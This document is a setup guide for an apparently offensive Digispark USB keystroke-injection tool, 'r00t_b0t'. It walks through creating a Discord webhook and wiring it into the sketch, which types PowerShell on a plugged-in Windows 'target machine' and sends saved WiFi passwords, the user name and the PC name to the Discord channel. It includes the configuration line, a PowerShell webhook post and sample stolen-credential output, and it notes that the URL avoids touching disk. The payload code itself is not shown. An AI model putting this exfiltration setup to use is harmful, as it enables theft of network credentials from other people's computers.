# Discord Integration Guide

This guide walks you through creating a Discord webhook and wiring it into the Digispark sketch.

---

## What you need

- A Discord account
- A Discord server where you have Manage Webhooks permission
- The file `digispark/discord/r00t_b0t.ino` open in Arduino IDE

---

## Step 1: Create a Discord Server (skip if you already have one)

1. Open Discord (desktop app or browser at discord.com).
2. On the left sidebar, click the **+** button at the bottom of the server list.
3. Click **Create My Own**.
4. Click **For me and my friends** or **For a club or community** depending on your preference.
5. Enter a server name (e.g., `Lab Alerts`) and click **Create**.

---

## Step 2: Create a Webhook

1. In your server, find the channel where you want to receive alerts. Right-click it and select **Edit Channel**.
   - Alternatively, click the gear icon that appears when you hover over the channel name.

2. In the channel settings sidebar, click **Integrations**.

3. Click **Webhooks**.

4. Click **New Webhook**.

5. A new webhook appears with a default name like `Captain Hook`. Click on it to expand the settings.

6. Change the name to something recognizable. Example: `r00t_b0t`

7. The channel is automatically set to the channel you edited. You can change it here using the **Channel** dropdown if needed.

8. Click **Copy Webhook URL**. The URL looks like this:
   ```
   https://discord.com/api/webhooks/1234567890123456789/ABCDefghIJKLmnoPQRsTUVwxyz-LONG-RANDOM-STRING
   ```
   Keep this URL private. Anyone with it can post to your channel.

9. Click **Save Changes**.

---

## Step 3: Configure the Sketch

Open `digispark/discord/r00t_b0t.ino` in Arduino IDE.

Find this line:

```cpp
DigiKeyboard.print("$env:WH='PASTE_WEBHOOK_URL_HERE'");
```

Replace `PASTE_WEBHOOK_URL_HERE` with the full webhook URL you copied:

```cpp
DigiKeyboard.print("$env:WH='https://discord.com/api/webhooks/1234567890/ABCDef...'");
```

The URL is typed as a live keystroke into PowerShell. It never touches disk, the script file or GitHub.

---

## Step 4: Flash and Test

1. Upload the sketch to your Digispark following the [main setup guide](../README.md#setup-guide).
2. Plug the flashed Digispark into a Windows machine that has saved WiFi networks.
3. Wait approximately 24 seconds.
4. Check your Discord channel. A message will appear formatted like:
   ```
   [r00t_b0t] Incoming Data
   ================================
   PC      : DESKTOP-XXXXXX
   User    : username
   Domain  : WORKGROUP
   ================================
   WiFi Passwords
   --------------------------------
   Network  : HomeNetwork
   Password : mypassword123
   --------------------------------
   ```

---

## Step 5: Verify the Webhook Works (optional pre-test)

Before flashing, you can test the webhook from PowerShell directly on your own machine:

```powershell
$wh = "https://discord.com/api/webhooks/YOUR_ID/YOUR_TOKEN"
$body = ConvertTo-Json @{ content = "Test message from Digispark HID Toolkit" }
Invoke-RestMethod -Uri $wh -Method Post -ContentType "application/json" -Body $body
```

If the message appears in your Discord channel, the webhook URL is correct.

---

## Troubleshooting

**No message in Discord**
- Paste the webhook URL into the PowerShell test above to verify it works independently.
- Confirm the Digispark flashed successfully (look for `Micronucleus done. Thank you!` in Arduino IDE).
- Check that the delay values in the sketch are long enough for your target machine to open PowerShell.

**`{"code": 50035}` or similar error**
- The webhook URL is malformed. Copy it again from Discord channel settings.

**Message arrives but WiFi passwords are missing**
- The target machine has no saved WiFi profiles. Test with `netsh wlan show profiles` in a command prompt to confirm profiles exist.

**Webhook was deleted**
- Discord webhooks can be deleted by anyone with Manage Webhooks permission in the server. If the URL stops working, recreate it in Step 2.
